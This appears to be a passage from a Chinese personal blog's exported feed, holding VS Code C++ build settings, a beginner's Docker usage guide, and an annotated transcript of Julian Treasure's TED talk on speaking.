<h3 id="settings-json-1"><a href="#settings-json-1" class="headerlink" title="settings.json"></a>settings.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;code-runner.runInTerminal&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.saveAllFilesBeforeRun&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.saveFileBeforeRun&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.preserveFocus&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;cmake.configureOnOpen&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;explorer.confirmDelete&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.fontSize&quot;</span><span class="punctuation">:</span> <span class="number">18</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.fontFamily&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Fira Code&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;explorer.confirmDragAndDrop&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.autoSave&quot;</span><span class="punctuation">:</span> <span class="string">&quot;onFocusChange&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.fontLigatures&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;editor.fontWeight&quot;</span><span class="punctuation">:</span> <span class="string">&quot;normal&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;workbench.iconTheme&quot;</span><span class="punctuation">:</span> <span class="string">&quot;material-icon-theme&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;terminal.integrated.enableMultiLinePasteWarning&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;code-runner.executorMap&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;cpp&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd $dir &amp;&amp; clang++ -std=c++17 $fileName -o $test.out &amp;&amp; $dir$test.out&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;python&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cd $dir &amp;&amp; python3 $fileName&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;files.associations&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;__bit_reference&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__config&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__debug&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__errc&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__hash_table&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__locale&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__mutex_base&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__node_handle&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__split_buffer&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__threading_support&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__tree&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__verbose_abort&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;array&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;atomic&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bitset&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cctype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;charconv&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;clocale&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cmath&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;complex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstdarg&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstddef&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstdint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstdio&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstdlib&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cstring&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ctime&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cwchar&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;cwctype&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;deque&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;exception&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;initializer_list&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;iomanip&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ios&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;iosfwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;iostream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;istream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;limits&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;locale&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;map&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;mutex&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;new&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;optional&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ostream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;queue&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;ratio&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;set&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;sstream&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stack&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;stdexcept&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;streambuf&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;string_view&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;system_error&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;tuple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;typeinfo&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;unordered_map&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;variant&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;vector&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__bits&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__nullptr&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__string&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;__tuple&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;bit&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;chrono&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;compare&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;concepts&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;memory&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;type_traits&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;algorithm&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cpp&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<h3 id="tasks-json-1"><a href="#tasks-json-1" class="headerlink" title="tasks.json"></a>tasks.json</h3><figure class="highlight json"><table><tr><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;tasks&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;cppbuild&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;label&quot;</span><span class="punctuation">:</span> <span class="string">&quot;C/C++: clang++ 生成活动文件&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;command&quot;</span><span class="punctuation">:</span> <span class="string">&quot;/usr/bin/clang++&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;args&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;-fcolor-diagnostics&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-fansi-escape-codes&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-g&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;file&#125;&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-o&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;$&#123;workspaceFolder&#125;//test&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="string">&quot;-std=c++11&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;options&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;cwd&quot;</span><span class="punctuation">:</span> <span class="string">&quot;$&#123;fileDirname&#125;&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;problemMatcher&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;$gcc&quot;</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;group&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;kind&quot;</span><span class="punctuation">:</span> <span class="string">&quot;build&quot;</span><span class="punctuation">,</span></span><br><span class="line">                <span class="attr">&quot;isDefault&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;detail&quot;</span><span class="punctuation">:</span> <span class="string">&quot;调试器生成的任务。&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2.0.0&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
      </tags>
  </entry>
  <entry>
    <title>docker使用指北</title>
    <url>/EATPOOP/docker_use/2024/01/17/</url>
    <content><![CDATA[<h2 id="pull-images-run-container"><a href="#pull-images-run-container" class="headerlink" title="pull images,run container"></a>pull images,run container</h2><p>要运行一个容器，通常需要使用容器管理工具，比如Docker。以下是一个简单的步骤来运行一个容器：</p>
<ol>
<li><p><strong>安装 Docker：</strong> 如果尚未安装 Docker，首先需要在计算机上安装 Docker。根据你的操作系统，可以在 Docker 官方网站上找到相应的安装说明。</p>
</li>
<li><p><strong>拉取容器镜像：</strong> 使用以下命令从 Docker Hub（或其他容器仓库）拉取容器镜像。例如，如果你想拉取一个名为 <code>example-image</code> 的镜像，可以运行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull example-image</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>运行容器：</strong> 一旦镜像被拉取，你可以使用 <code>docker run</code> 命令来启动容器。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run example-image</span><br></pre></td></tr></table></figure>

<p>这将在一个新的容器中运行 <code>example-image</code> 镜像。</p>
</li>
<li><p><strong>自定义容器运行参数：</strong> 你还可以使用各种选项来自定义容器的运行。例如，你可能想要在后台运行容器、指定端口映射等。具体选项取决于你的需求。</p>
</li>
</ol>
<p>这只是一个基本示例，实际情况可能更加复杂，具体取决于你使用的容器技术和容器镜像。确保查阅相关文档以获取详细信息。</p>
<h2 id="run-existed-container"><a href="#run-existed-container" class="headerlink" title="run existed container"></a>run existed container</h2><ol>
<li><p><strong>查看已有容器：</strong> 使用以下命令查看当前系统中存在的容器：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker ps -a</span><br></pre></td></tr></table></figure>

<p>这将列出所有容器，包括运行中的和已停止的。</p>
</li>
<li><p><strong>启动容器：</strong> 选择你想要启动的容器，并使用容器的名称或ID运行以下命令：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bashCopy code</span><br><span class="line">docker start &lt;container_name_or_id&gt;</span><br></pre></td></tr></table></figure>

<p>将 <code>&lt;container_name_or_id&gt;</code> 替换为实际容器的名称或ID。</p>
</li>
<li><p><strong>附加到容器（可选）：</strong> 如果需要与容器交互，可以使用 <code>docker attach</code> 命令附加到容器的标准输入、输出和错误流。例如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker attach &lt;container_name_or_id&gt;</span><br></pre></td></tr></table></figure>

<p>这使你可以在容器内执行命令。</p>
</li>
</ol>
<p>请注意，启动容器后，它可能会在后台运行。如果要在前台运行并查看容器的输出，可以使用 <code>-i</code> 和 <code>-t</code> 选项：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker start -it &lt;container_name_or_id&gt;</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>EATPOOP</category>
      </categories>
      <tags>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>how to speak详解</title>
    <url>/TED/TED_2/2024/02/01/</url>
    <content><![CDATA[<h1 id="How-to-speak-so-that-people-want-to-listen"><a href="#How-to-speak-so-that-people-want-to-listen" class="headerlink" title="How to speak so that people want to listen"></a>How to speak so that people want to listen</h1><p><em><strong>Julian Treasure |TED Global 2013 |June 2013</strong></em></p>
<blockquote>
<p><strong><a href="https://www.bilibili.com/video/BV1Qe4y1B7E7/?spm_id_from=333.999.0.0&vd_source=48b7f9b11252cb5ee80182ee9f3745e2">Speaking Video</a></strong></p>
</blockquote>
<p><a href="https://pic.imgdb.cn/item/65826028c458853aefbc80d0.png"><img src="https://cdn.jsdelivr.net/gh/zhzvite/picgoroom@img/img/202402071320041.png"></a></p>
<p>The human voice: It’s the instrument we all play. It’s the most powerful sound in the world, probably. It’s the only one that can start a war or say “I love you.” And yet many people have the experience that when they speak, people don’t listen to them. And why is that? How can we speak powerfully to make change in the world?What I’d like to suggest, there are a number of habits that we need to move away from. I’ve assembled for your pleasure here seven deadly sins of speaking.(说话的七宗罪) I’m not pretending this is an exhaustive(详细的) list, but these seven, I think, are pretty large habits that we can all fall into.（容易犯）     </p>
<h2 id="seven-deadly-sins-of-speaking"><a href="#seven-deadly-sins-of-speaking" class="headerlink" title="seven deadly sins of speaking"></a>seven deadly sins of speaking</h2><h3 id="gossip"><a href="#gossip" class="headerlink" title="gossip"></a>gossip</h3><p>First, gossip(流言，闲言碎语）. Speaking ill of somebody who’s not present. Not a nice habit, and we know perfectly well the person gossiping, five minutes later, will be gossiping about us.</p>
<h3 id="judging"><a href="#judging" class="headerlink" title="judging"></a>judging</h3><p>Second, judging. We know people who are like this in conversation, and it’s very hard to listen to somebody if you know that you’re being judged and found wanting(不合格,有欠缺的) at the same time.</p>
<h3 id="negativity"><a href="#negativity" class="headerlink" title="negativity"></a>negativity</h3><p>Third, negativity. You can fall into this. My mother, in the last years of her life, became very negative, and it’s hard to listen. I remember one day, I said to her, “It’s October 1 today,” and she said, “I know, isn’t it dreadful( <strong>extremely unpleasant</strong>)?”</p>
<p>(Laughter)</p>
<p>It’s hard to listen when somebody’s that negative.</p>
<p>(Laughter)</p>
<h3 id="complaining"><a href="#complaining" class="headerlink" title="complaining"></a>complaining</h3><p>And another form of negativity, complaining. Well, this is the national art of the UK. It’s our national sport. We complain about the weather, sport, about politics, about everything, but actually, complaining is viral（病毒性的） misery.（痛苦） It’s not spreading sunshine and lightness in the world.</p>
<h3 id="excuses"><a href="#excuses" class="headerlink" title="excuses"></a>excuses</h3><p> Excuses. We’ve all met this guy（坏蛋）. Maybe we’ve all been this guy. Some people have a blame thrower（指责癖好）. They just pass it on to everybody else  and don’t take responsibility for their actions, and again, hard to listen to somebody who is being like that. </p>
<h3 id="lying"><a href="#lying" class="headerlink" title="lying"></a>lying</h3><p>Penultimate（倒数第二的）, the sixth of the seven, embroidery,(刺绣&#x2F;夸张之间，渲染) exaggeration（吹牛，浮夸）. It demeans（贬低） our language, actually, sometimes. For example, if I see something that really is awesome, what do I call it?</p>
<p>(Laughter)</p>
<p>And then, of course, this exaggeration becomes lying, and we don’t want to listen to people we know are lying to us.</p>
<h3 id="dogmatism-固执己见"><a href="#dogmatism-固执己见" class="headerlink" title="dogmatism(固执己见)"></a>dogmatism(固执己见)</h3><p> And finally, dogmatism. The confusion of facts with opinions. When those two things get conflated, you’re listening into the wind. You know, somebody is bombarding（轰炸） you with their opinions as if they were true. It’s difficult to listen to that.So here they are, seven deadly sins of speaking. These are things I think we need to avoid. </p>
<p> But is there a positive way to think about this? Yes, there is. I’d like to suggest that there are four really powerful cornerstones, foundations, that we can stand on if we want our speech to be powerful and to make change in the world. </p>
<h2 id="HAIL"><a href="#HAIL" class="headerlink" title="HAIL"></a>HAIL</h2><p>Fortunately, these things spell a word. The word is “hail,” and it has a great definition as well. I’m not talking about the stuff that falls from the sky and hits you on the head. I’m talking about this definition, <strong>to greet or acclaim enthusiastically</strong>, which is how I think our words will be received if we stand on these four things.So what do they stand for? See if you can guess. </p>
<p>The H, honesty, of course, being true in what you say, being straight and clear. The A is authenticity,  just being yourself. A friend of mine described it as standing in your own truth, which I think is a lovely way to put it. The I is integrity(一身正气）, being your word, actually doing what you say, and being somebody people can trust. And the L is love. I don’t mean romantic love, but I do mean wishing people well, for two reasons. </p>
<p> First of all, I think absolute honesty may not be what we want. I mean, my goodness, you look ugly this morning. Perhaps that’s not necessary. Tempered with love（适当的带着爱）, of course, honesty is a great thing. But also, if you’re really wishing somebody well, it’s very hard to judge them at the same time. I’m not even sure you can do those two things simultaneously（同时地）. So hail.Also, now that’s what you say, and it’s like the old song, it is what you say, it’s also the way that you say it. You have an amazing toolbox. This instrument is incredible, and yet this is a toolbox that very few people have ever opened. I’d like to have a little rummage（翻找，调查） in there with you now and just pull a few tools out that you might like to take away and play with, which will increase the power of your speaking.</p>
<h2 id="Some-tools"><a href="#Some-tools" class="headerlink" title="Some tools"></a>Some tools</h2><h3 id="register（音域）"><a href="#register（音域）" class="headerlink" title="register（音域）"></a>register（音域）</h3><p> Register, for example. Now, falsetto register（假声） may not b e very useful most of the time, but there’s a register in between.  I’m not going to get very technical about this for any of you who are voice coaches. You can locate your voice, however. So if I talk up here in my nose, you can hear the difference. If I go down here in my throat, which is where most of us speak from most of the time. But if you want weight, you need to go down here to the chest. You hear the difference? We vote for politicians with lower voices, it’s true, because we associate depth with power and with authority. That’s register.</p>
<h3 id="timbre（音色）"><a href="#timbre（音色）" class="headerlink" title="timbre（音色）"></a>timbre（音色）</h3><p>Then we have timbre. It’s the way your voice feels. Again, the research shows that we prefer voices which are rich, smooth, warm, like hot chocolate. Well if that’s not you, that’s not the end of the world, because you can train. Go and get a voice coach. And there are amazing things you can do with breathing, with posture（姿势） , and with exercises to improve the timbre of your voice.</p>
<h3 id="prosody"><a href="#prosody" class="headerlink" title="prosody"></a>prosody</h3><p>Then prosody（韵律）. I love prosody. This is the sing-song, the meta-language that we use in order to impart(传达传授，透露) meaning. It’s root one for meaning in conversation. People who speak all on one note are really quite hard to listen to if they don’t have any prosody at all. That’s where the word “monotonic（没有起伏，单调） “ comes from, or monotonous, monotone. Also, we have repetitive prosody now coming in, where every sentence ends as if it were a question when it’s actually not a question, it’s a statement? </p>
<p>(Laughter)</p>
<p>And if you repeat that one, it’s actually restricting your ability to communicate through prosody, which I think is a shame, so let’s try and break that habit. </p>
<h3 id="pace"><a href="#pace" class="headerlink" title="pace"></a>pace</h3><p>Pace. I can get very excited by saying something really quickly, or I can slow right down to emphasize, and at the end of that, of course, is our old friend silence. There’s nothing wrong with a bit of silence in a talk, is there? We don’t have to fill it with ums and ahs. It can be very powerful.</p>
<h3 id="pitch-音高"><a href="#pitch-音高" class="headerlink" title="pitch(音高)"></a>pitch(音高)</h3><p>Of course, pitch often goes along with pace to indicate arousal（激动，兴奋）, but you can do it just with pitch. Where did you leave my keys? (Higher pitch) Where did you leave my keys? So, slightly different meaning in those two deliveries. </p>
<h3 id="volume"><a href="#volume" class="headerlink" title="volume"></a>volume</h3><p>And finally, volume. (Loud) I can get really excited by using volume. Sorry about that, if I startled(打扰受惊，使吃惊) anybody. Or, I can have you really pay attention by getting very quiet. Some people broadcast the whole time. Try not to do that. That’s called sodcasting（公放音乐）,</p>
<p>(Laughter)</p>
<p>Imposing（impose强制实行） your sound on people around you carelessly and inconsiderately. Not nice.Of course, where this all comes into play most of all is when you’ve got something really important to do. It might be standing on a stage like this and giving a talk to people. It might be proposing marriage（求婚）, asking for a raise, a wedding speech. Whatever it is, if it’s really important, you owe it to yourself to look at this toolbox and the engine that it’s going to work on, and no engine works well without being warmed up. Warm up your voice.Actually, let me show you how to do that. </p>
<h3 id="the-way-to-warm-up"><a href="#the-way-to-warm-up" class="headerlink" title="the way to warm up"></a>the way to warm up</h3><p>Would you all like to stand up for a moment? I’m going to show you the six vocal warm-up exercises that I do before every talk I ever do. Any time you’re going to talk to anybody important, do these. </p>
<p>First, arms up, deep breath in, and sigh out, ahhhhh, like that. One more time. Ahhhh, very good. Now we’re going to warm up our lips, and we’re going to go Ba, Ba, Ba, Ba, Ba, Ba, Ba, Ba. Very good. And now, brrrrrrrrrr, just like when you were a kid. Now your lips should be coming alive. We’re going to do the tongue next with exaggerated(夸张) la, la, la, la, la, la, la, la, la. Beautiful. You’re getting really good at this. And then, roll an R. Rrrrrrr. That’s like champagne（香槟酒） for the tongue. Finally, and if I can only do one, the pros（老手，运动员） call this the <strong>siren</strong>（警报器）. It’s really good. It starts with “we” and goes to “aw.” The “we” is high, the “aw” is low. So you go, weeeaawww, weeeaa<a href="http://www.fantastic/">www.Fantastic</a>. Give yourselves a round of applause. Take a seat, thank you.</p>
<p>(Applause)</p>
<h2 id="Conclude"><a href="#Conclude" class="headerlink" title="Conclude"></a>Conclude</h2><p>Next time you speak, do those in advance. Now let me just put this in context to close. This is a serious point here. This is where we are now, right? We speak not very well to people who simply aren’t listening in an environment that’s all about noise and bad acoustics（听觉的）. I have talked about that on this stage in different phases. What would the world be like if we were speaking powerfully to people who were listening consciously in environments which were actually fit for purpose? Or to make that a bit larger, what would the world be like if we were creating sound consciously and consuming（倾听）sound consciously and designing all our environments consciously for sound? That would be a world that does sound beautiful, and one where understanding would be the norm, and that is an idea worth spreading.</p>
<p>Thank you. </p>
<p>(Applause)</p>
]]></content>
      <categories>
        <category>TED</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>TED</tag>
      </tags>
  </entry>
  <entry>
    <title>win美化fluent terminal总结</title>
    <url>/EATPOOP/fluent_use/2024/01/18/</url>
    <content><![CDATA[<blockquote>
<p>用命令行安装了无数次oh-my-posh,我无奈大喊holy-shit!</p>
